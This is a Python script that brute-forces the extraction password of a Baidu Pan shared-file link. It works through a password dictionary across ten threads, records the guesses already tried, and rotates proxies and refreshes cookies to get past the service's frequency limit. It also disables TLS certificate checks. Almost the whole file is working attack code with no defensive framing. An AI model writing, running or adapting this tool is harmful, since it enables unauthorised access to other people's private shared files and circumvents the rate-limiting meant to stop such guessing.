import http.cookiejar
import os
import random
import ssl
import threading
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

from loguru import logger as log

ssl._create_default_https_context = ssl._create_unverified_context

password = ""
pwd_pool = []
proxy_pool = {}

total_pwd_cnt = 0

proxy_record = {}
thread_process_cnt = {}

# example: "surl=xxxx"
url_suffix = ""

delay = 2000
thread_cnt = 10

current_date = datetime.now().strftime("%Y-%m-%d")

verify_headers = {
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Length": "26",
    "Host": "pan.baidu.com",
    "Origin": "https://pan.baidu.com",
    "Referer": "https://pan.baidu.com/share/init?" + url_suffix,
    "Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest"
}


def load_pwd_pool():
    """
    Load a dictionary from a file and return it as a list.

    :param pwd_pool_file: The file path to the password pool file.
    :return: A list containing the passwords from the file.
    """

    wrong_pwds = set()
    global pwd_pool
    if not os.path.exists("wrong_pwds.txt"):
        with open("wrong_pwds.txt", "w") as fp:
            pass

    with open("wrong_pwds.txt", "r") as fp:
        for line in fp:
            wrong_pwds.add(line.strip('\n'))

    if not os.path.exists("merged_pwd_pool.txt"):
        with open("pwd_pool.txt", "r") as fp:
            pwd_pool = set(line.strip('\n') for line in fp)
        pwd_pool = pwd_pool - wrong_pwds
    else:
        with open("merged_pwd_pool.txt", "r") as fp:
            pwd_pool = set(line.strip('\n') for line in fp)
        pwd_pool = pwd_pool - wrong_pwds

    # merge pwd pool
    with open("merged_pwd_pool.txt", "w") as fp:
        for pwd in pwd_pool:
            fp.write(pwd + '\n')

    # clear wrong pwds
    with open("wrong_pwds.txt", "w") as fp:
        pass

    pwd_pool = list(pwd_pool)


def load_proxy_pool():
    """
    Load a proxy pool from a file.
    """

    global proxy_pool
    with open("proxy_pool.txt", "r") as fp:
        for line in fp:
            proxy = line.strip('\n')
            proxy_pool[proxy] = 0


def change_proxy() -> dict:
    proxy = {'https': ''}
    if not proxy_pool:
        return proxy

    # get the least used proxy
    least_used_proxy = min(proxy_pool, key=proxy_pool.get)
    proxy_pool[least_used_proxy] += 1
    proxy['https'] = least_used_proxy
    proxy['http'] = least_used_proxy

    return proxy


def get_opener(thread_name, new_cookie=False) -> urllib.request.build_opener:
    need_change_proxy = True
    while need_change_proxy:
        proxy = change_proxy()
        proxy_record[proxy['https']] = proxy_record.get(proxy['https'], 0) + 1
        cookie = http.cookiejar.MozillaCookieJar("cookie.txt")
        handler = urllib.request.HTTPCookieProcessor(cookie)
        opener = urllib.request.build_opener(handler, urllib.request.ProxyHandler(proxy)) if proxy[
            'https'] else urllib.request.build_opener(handler)

        if not new_cookie:
            return opener

        try:
            request = urllib.request.Request("https://pan.baidu.com/share/init?" + url_suffix)
            opener.open(request, timeout=30)

            log.info("[{}]: [{}] request cookie success", thread_name, proxy['https'])
            return opener
        except Exception as e:
            log.warning("[{}]: [{}] request cookie error: {}", thread_name, proxy['https'], str(e))
            proxy['https'] = ''
            proxy['http'] = ''
            time.sleep(1)
            need_change_proxy = True
            continue


def verify(thread_name, opener, trying_pwd) -> int:
    try:
        post_url = "https://pan.baidu.com/share/verify?" + url_suffix + "&t=" + str(round(
            time.time() * 1000)) + "&bdstoken=null&channel=chunlei&web=1&app_id=250528&25a0b16af06504103a0f9f97309f9b68&logid=MTUxOTgxMzU1MDIyMTAuMzUzMDQ1NDMwMTM5NjUyOTU=&clienttype=0"
        data = {"pwd": trying_pwd, "vcode": "", "vcode_str": ""}
        request = urllib.request.Request(post_url, headers=verify_headers, data=urllib.parse.urlencode(data).encode())
        response = opener.open(request, timeout=30)
        check = response.read().decode()
        if check.find(r'"errno":-9') != -1:
            with open("wrong_pwds.txt", "a") as fp:
                if fp.tell() != 0:
                    fp.write("\n")
                fp.write(trying_pwd)
                log.info("[{}]: wrong password: {}", thread_name, trying_pwd)
            return -1
        elif check.find(r'"errno":0') != -1:
            global password
            password = trying_pwd
            log.info("[{}]: proxy: right password: {}", thread_name, trying_pwd)
            with open(str.lower(thread_name) + "_password.txt", "w") as fp:
                fp.write(trying_pwd)

            return 1
        elif check.find(r'"errno":-64') != -1:
            log.error("[{}]: proxy: frequency limit: {}", thread_name, trying_pwd)
            return -2

        return -2
    except Exception as e:
        log.info("[{}]: request verify error: {}", thread_name, str(e))
        return -3


def crack_password(pwds):
    loop_cnt = 0
    trying_pwd = ""
    global password
    global delay
    while loop_cnt >= 0 and password == "":
        time.sleep(int(delay) / 1000)

        current_thread_name = threading.current_thread().name

        if trying_pwd == "" and pwds:
            random.shuffle(pwds)

        trying_pwd = pwds.pop(0) if pwds and trying_pwd == "" else trying_pwd
        if not trying_pwd:
            log.info("[{}]: all passwords tried.", current_thread_name)
            return

        log.info("[{}]: left {} passwords, current trying password: {}", current_thread_name, len(pwds), trying_pwd)

        # get opener
        opener = get_opener(current_thread_name, loop_cnt % 3 == 0)

        # verify password
        verify_result = verify(current_thread_name, opener, trying_pwd)
        if verify_result == 1:
            # password found, exit the loop
            loop_cnt = -1
            trying_pwd = ""
        elif verify_result == -1:
            # wrong password, try next password
            thread_process_cnt[current_thread_name] = thread_process_cnt.get(current_thread_name, 0) + 1
            loop_cnt += 1
            trying_pwd = ""
        elif verify_result == -2 or verify_result == -3:
            # time limit exceeded, try next password
            loop_cnt += 1


if __name__ == "__main__":
    # init logger
    log_filename = f"logs/log_{current_date}.log"
    log.add(log_filename, rotation="500MB", encoding="utf-8", enqueue=True, compression="zip",
            retention="1 days")

    # init proxy pool
    load_proxy_pool()
    log.info("loaded {} proxies successfully", len(proxy_pool))

    # init pwd pool
    load_pwd_pool()
    log.info("loaded {} passwords successfully", len(pwd_pool))

    # init thread pool
    thread_pool = ThreadPoolExecutor(max_workers=thread_cnt)

    per_thread_pwds_cnt = len(pwd_pool) // thread_cnt
    for i in range(thread_cnt):
        if i == thread_cnt - 1:
            thread_pool.submit(crack_password, pwd_pool[i * per_thread_pwds_cnt:])
        else:
            thread_pool.submit(crack_password, pwd_pool[i * per_thread_pwds_cnt:(i + 1) * per_thread_pwds_cnt])

    # wait for all threads to finish
    thread_pool.shutdown(wait=True)
